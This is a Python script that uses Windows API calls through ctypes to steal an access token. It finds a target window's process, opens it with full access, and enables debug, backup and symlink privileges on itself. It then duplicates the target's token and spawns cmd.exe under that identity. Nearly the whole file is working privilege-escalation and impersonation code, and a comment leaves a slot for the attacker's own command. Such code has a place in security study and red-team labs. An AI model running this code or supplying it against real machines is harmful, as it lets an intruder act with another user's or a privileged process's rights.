import ctypes
# import windows types
from ctypes.wintypes import DWORD, BOOL, HANDLE, LPWSTR, WORD, LPBYTE, ULONG, LONG, LPVOID
from os import system
from termcolor import colored

# Clearing Console window
system("cls")

# Loading DLLs handels
kernel_handle = ctypes.WinDLL("Kernel32.dll")
user_handle = ctypes.WinDLL("User32.dll")
advapi_handle = ctypes.WinDLL("Advapi32.dll")

# ------------------------------------------------- #
# the following numbers/flags are from C# libraries #
# ------------------------------------------------- #

# Access rights from
PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)

# Token Access rights
STANDARD_RIGHTS_REQUIRED = 0x000F0000
STANDARD_RIGHTS_READ = 0x00020000
TOKEN_ASSIGN_PRIMARY = 0x0001
TOKEN_DUPLICATE = 0x0002
TOKEN_IMPERSONATION = 0x0004
TOKEN_QUERY = 0x0008
TOKEN_QUERY_SOURCE = 0x0010
TOKEN_ADJUST_PRIVILEGES = 0x0020
TOKEN_ADJUST_GROUPS = 0x0040
TOKEN_ADJUST_DEFAULT = 0x0080
TOKEN_ADJUST_SESSIONID = 0x0100
TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY)
TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED |
					TOKEN_ASSIGN_PRIMARY     |
					TOKEN_DUPLICATE          |
					TOKEN_IMPERSONATION      |
					TOKEN_QUERY              |
					TOKEN_QUERY_SOURCE       |
					TOKEN_ADJUST_PRIVILEGES  |
					TOKEN_ADJUST_GROUPS      |
					TOKEN_ADJUST_DEFAULT     |
					TOKEN_ADJUST_SESSIONID)

# Privilege Enabled Mask
SE_PRIVILEGE_ENABLED = 0x00000002

# -------------------------------------- #
# Needed Structure for windows API calls #
# -------------------------------------- #

class LUID(ctypes.Structure):
    """ The LUID structure is an opaque structure that specifies an identifier that is guaranteed to be unique on the local machine.
    [Documentation link] -> https://docs.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-luid """

    _fields_ = [
        ("LowPart", ULONG),
        ("HighPart", LONG)
    ]

class LUID_AND_ATTRIBUTES(ctypes.Structure):
    """ The LUID_AND_ATTRIBUTES structure represents a locally unique identifier (LUID) and its attributes.
    [Documentation link] -> https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-luid_and_attributes """

    _fields_ = [
        ("Luid", LUID),
        ("Attributes", DWORD)
    ]

class PRIVILEGE_SET(ctypes.Structure):
    """ The PRIVILEGE_SET structure specifies a set of privileges. It is also used to indicate which, if any, privileges are held by a user or group requesting access to an object.
    [Documentation link] -> https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-privilege_set """
    
    _fields_ = [
        ("PrivilegeCount", DWORD),
        ("Control", DWORD),
        ("Privilege", LUID_AND_ATTRIBUTES)
    ]

class TOKEN_PRIVILEGES (ctypes.Structure):
    """ The TOKEN_PRIVILEGES structure contains information about a set of privileges for an access token.
    [Documentation link] -> https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-token_privileges
    """

    _fields_ = [
        ("PrivilegeCount", DWORD),
        ("Privileges", LUID_AND_ATTRIBUTES)
    ]

class SECURITY_ATTRIBUTES(ctypes.Structure):
    """ The SECURITY_ATTRIBUTES structure contains the security descriptor for an object and specifies whether the handle retrieved by specifying this structure is inheritable.
    This structure provides security settings for objects created by various functions, such as CreateFile, CreatePipe, CreateProcess, RegCreateKeyEx, or RegSaveKeyEx.
    [Documentation link] -> https://docs.microsoft.com/en-us/windows/win32/api/wtypesbase/ns-wtypesbase-security_attributes
    """

    _fields_ = [
        ("nLength", DWORD),
        ("lpSecurityDescriptor", HANDLE),
        ("nInheritHandle", BOOL)
    ]

class STARTUPINFO(ctypes.Structure):
    """ Specifies the window station, desktop, standard handles, and appearance of the main window for a process at creation time.
    [Documentation link] -> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
    """
    _fields_ = [
	("cb", DWORD),
	("lpReserved", LPWSTR),
	("lpDesktop", LPWSTR),
	("lpTitle", LPWSTR),
	("dwX", DWORD),
	("dxY", DWORD),
	("dwXSize", DWORD),
	("dwYSize", DWORD),
	("dwXCountChars", DWORD),
	("dwYCountChars", DWORD),
	("dwFillAttribute", DWORD),
	("dwFlags", DWORD),
	("wShowWindow", WORD),
	("cbReserved2", WORD),
	("lpReserved2", LPBYTE),
	("hStdInput", HANDLE),
	("hStdOutput", HANDLE),
	("hStdError", HANDLE)
	]

class PROCESS_INFORMATION(ctypes.Structure):
    """Contains information about a newly created process and its primary thread.
    It is used with the CreateProcess, CreateProcessAsUser, CreateProcessWithLogonW, or CreateProcessWithTokenW function.
    [Documentation link] -> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information
    """
    _fields_ = [
	("hProcess", HANDLE),
	("hThread", HANDLE),
	("dwProcessId", DWORD),
	("dwThreadId", DWORD)
	]


# -------------------------------------- #
# Needed Functions for windows API calls #
# -------------------------------------- #

def openProcessByPID(pid):
    """ Opens an existing local process object.
    [Documentation link] -> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
    Args:
        pid ([int]): [The process PID]
    Returns:
        process_handel ([handel])"""

	# OpenProcess structure attributes
    dwDesiredAccess = PROCESS_ALL_ACCESS
    bInheritHandle = False
    dwProcessId = pid
    try:
        # Open the Process
        process_handel = kernel_handle.OpenProcess(dwDesiredAccess, bInheritHandle, dwProcessId)
        if process_handel <= 0: # Check if we have a valid Handle to the process
            print(colored(f"[ERROR] Could Not Grab Privileged Handle! Error Code: {kernel_handle.GetLastError()}", "red"))
            return 1
        print(colored("[INFO] Privileged Handle Opened...", "green"))
        return process_handel
    except Exception as error:
        print(colored(f"[System-Error] \n{error}\n", "red"))


def enablePrivilege(priv, handle):
    """ The LookupPrivilegeValue function retrieves the locally unique identifier (LUID) used on a specified system to locally represent the specified privilege name.
    [Documentation linkس]
        LookupPrivilegeValueW -> https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-lookupprivilegevaluew
        PrivilegeCheck -> https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-privilegecheck
        AdjustTokenPrivileges -> https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-adjusttokenprivileges
    Args:
        priv ([window's types/attribute]): [Privilege to be eneabled]
        handle ([handle]): [process handle]
    Returns:
        <flag> ([Bool]): [flag if it was done truly or not.]
    """

	# First use the LookupPrivilegeValue API Call to get the LUID based on the String Privilege name
	# Setup a PRIVILEGE_SET for the PrivilegeCheck Call to be used later - We need the LUID to be used
    requiredPrivileges = PRIVILEGE_SET()
    # We are only looking at 1 Privilege at a time here
    requiredPrivileges.PrivilegeCount = 1
    # Setup a new LUID_AND_ATTRIBUTES
    requiredPrivileges.Privileges = LUID_AND_ATTRIBUTES()
    # Setup a New LUID inside of the LUID_AND_ATTRIBUTES structure
    requiredPrivileges.Privileges.Luid = LUID()

	# Params for LookupPrivilegeValueW function API Call
    lpSystemName = None  # to find the privilege name on the local system.
    lpName = priv        # privilege name

    response = advapi_handle.LookupPrivilegeValueW(lpSystemName, lpName, ctypes.byref(requiredPrivileges.Privileges.Luid))
    if response > 0:
        print(colored(f"[INFO] Lookup For {priv} Privilege Worked...", "green"))
    else:
        print(colored(f"[ERROR] Lookup for {priv} Failed! Error Code: {kernel_handle.GetLastError()}", "red"))
        return 1

	# Now our LUID is setup and pointing to the correct Privilege we can check to see if its enabled
    privilege_result = ctypes.c_long() # init a pointer
    response = advapi_handle.PrivilegeCheck(handle, ctypes.byref(requiredPrivileges), ctypes.byref(privilege_result))
    if response > 0:
        print(colored("[INFO] PrivilegeCheck Worked...", "green"))
    else:
        print(colored(f"[ERROR] PrivilegeCheck Failed! Error Code: {kernel_handle.GetLastError()}", "red"))
        return 1

	# We can check pfResult to see if our Privilege is enabled or not
    if privilege_result:
        print(colored(f"[INFO] Privilege {priv} is Enabled...", "green"))
        return 0
    else:
        print(colored(f"[INFO] {priv} Privilege is NOT Enabled...", "green"))
        requiredPrivileges.Privileges.Attributes = SE_PRIVILEGE_ENABLED # Enable if currently Disabled

	# We will not attempt to modify the selected Privilege in the Token
    DisableAllPrivileges = False
    NewState = TOKEN_PRIVILEGES()
    BufferLength = ctypes.sizeof(NewState)
    PreviousState = ctypes.c_void_p()
    ReturnLength = ctypes.c_void_p()
	# Configure Token Privileges
    NewState.PrivilegeCount = 1;
    NewState.Privileges = requiredPrivileges.Privileges # Set the LUID_AND_ATTRIBUTES to our new structure

    response = advapi_handle.AdjustTokenPrivileges(
        handle,                         # A handle to the access token that contains the privileges to be modified.
        DisableAllPrivileges,           # we set it to False to make the function modifies privileges based on the information pointed to by the NewState parameter.
        ctypes.byref(NewState),
        BufferLength,
        ctypes.byref(PreviousState),
        ctypes.byref(ReturnLength))

    if response > 0:
        print(colored(f"[INFO] AdjustTokenPrivileges of {priv} Enabled...", "green"))
    else:
        print(colored(f"[ERROR] AdjustTokenPrivileges {priv} Not Enabled! Error Code: {kernel_handle.GetLastError()}", "red"))
        return 1
    return 0


def openProcToken(pHandle):
    """ The OpenProcessToken function opens the access token associated with a process.
    [Documentation link] -> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken
    Args:
        pHandle ([handle]): [process handle, the process to be opened]
    Returns:
       TokenHandle [handle]: [token of the process] """
    
	# Open a Handle to the Process's Token Directly
    ProcessHandle = pHandle
    DesiredAccess = TOKEN_ALL_ACCESS
    TokenHandle = ctypes.c_void_p()     # pointer to store/point at the token value

    response = kernel_handle.OpenProcessToken(ProcessHandle, DesiredAccess, ctypes.byref(TokenHandle))
    if response > 0:
        print(colored(f"[INFO] Handle to Process Token Created! Token: {TokenHandle}", "green"))
        return TokenHandle
    else:
        print(colored(f"[ERROR] Could Not Grab Privileged Handle to Token! Error Code: {kernel_handle.GetLastError()}", "red"))
        return 1



# Our script starts here
if __name__ == '__main__':

    privilege_names = ["SEDebugPrivilege", "SEBackupPrivilege", "SECreateSymbolicLinkPrivilege"]
    # Grab The Window Name from the user
    name = input("[/] Enter Window Name To Hook Into~$ ")
    lpWindowName = ctypes.c_char_p(name.encode('utf-8'))

    # Grab a Handle to the Process, calling windows API
    hWnd = user_handle.FindWindowA(None, lpWindowName)
    if hWnd == 0:
        print(colored(f"[ERROR] Could Not Grab Handle! Error Code: {kernel_handle.GetLastError()}", "red"))
        exit(1)
    else:
        print(colored("[INFO] Grabbed Handle...", "green"))

    # Get the PID of the process at the handle
    lpdwProcessId = ctypes.c_ulong()
    # We use byref to pass a pointer to the value as needed by the API Call
    response = user_handle.GetWindowThreadProcessId(hWnd, ctypes.byref(lpdwProcessId))
    if response == 0:
        print(colored(f"[ERROR] Could Not Get PID from Handle! Error Code: {kernel_handle.GetLastError()}", "red"))
    else:
        print(colored("[INFO] Found PID...", "green"))

    # Open The Process and Grab a Table to its Token
    TokenHandle = openProcToken(openProcessByPID(lpdwProcessId))
    # Get Handle of Current Process
    currentProcessHandle = openProcToken(openProcessByPID(kernel_handle.GetCurrentProcessId()))
    # Attempt to Enable SeDebugPrivilege on Current Process to be able to use token duplication

    for privilege in privilege_names:
        print(colored(f"[INFO] Enabling {privilege} on Current Process..", "green"))
        response = enablePrivilege(privilege, currentProcessHandle)
        if response != 0:
            print(colored("[ERROR] Could Not Enable Privileges...", "red"))
            exit(1)


    # Duplicate Token On Hooked Process
    hExistingToken = ctypes.c_void_p()
    dwDesiredAccess = TOKEN_ALL_ACCESS
    lpTokenAttributes = SECURITY_ATTRIBUTES()
    ImpersonationLevel = 2 # Set to SecurityImpersonation enum
    TokenType = 1 # Set to Token_Type enum as Primary

    # Configure the SECURITY_ATTRIBUTES Structure
    lpTokenAttributes.bInheritHandle = False
    lpTokenAttributes.lpSecurityDescriptor = ctypes.c_void_p()
    lpTokenAttributes.nLength = ctypes.sizeof(lpTokenAttributes)

    print(colored("[INFO] Duplicating Token on Hooked Process...", "green"))

    # Issue the Token Duplication Call
    response = advapi_handle.DuplicateTokenEx(
        TokenHandle,
        dwDesiredAccess,
        ctypes.byref(lpTokenAttributes),
        ImpersonationLevel,
        TokenType,
        ctypes.byref(hExistingToken))

    if response == 0:
        print(colored(f"[ERROR] Could Not Duplicate Token... Error Code: {kernel_handle.GetLastError()}", "red"))
        exit(1)

    # Now We Want to create A Process As that Current User!
    # We will use the Win API Call CreateProcessWithTokenW
    hToken = hExistingToken
    # Use the Flag LOGON_WITH_PROFILE
    dwLogonFlags = 0x00000001
    # process path
    lpApplicationName = "C:\\Windows\\System32\\cmd.exe"
    
    # your command here after "/c"
    lpCommandLine = None
    # Use the Flag CREATE_NEW_CONSOLE
    dwCreationFlags = 0x00000010
    lpEnvironment = ctypes.c_void_p()
    lpCurrentDirectory = None
    lpStartupInfo = STARTUPINFO()
    lpProcessInformation = PROCESS_INFORMATION()

    # Configure Startup Info
    # make window visable
    lpStartupInfo.wShowWindow = 0x1 
    # Use to flag to look at wShowWindow
    lpStartupInfo.dwFlags = 0x1 
    lpStartupInfo.cb = ctypes.sizeof(lpStartupInfo)

    # starting the process with token
    response = advapi_handle.CreateProcessWithTokenW(
        hToken,
        dwLogonFlags,
        lpApplicationName,
        lpCommandLine,
        dwCreationFlags,
        lpEnvironment,
        lpCurrentDirectory,
        ctypes.byref(lpStartupInfo),
        ctypes.byref(lpProcessInformation))

    if response == 0:
        print(colored(f"[ERROR] Could Not Create Process With Duplicated Token... Error Code: {kernel_handle.GetLastError()}", "red"))
        exit(1)

    print(colored("[INFO] Created Impersonated Proces!", "green"))

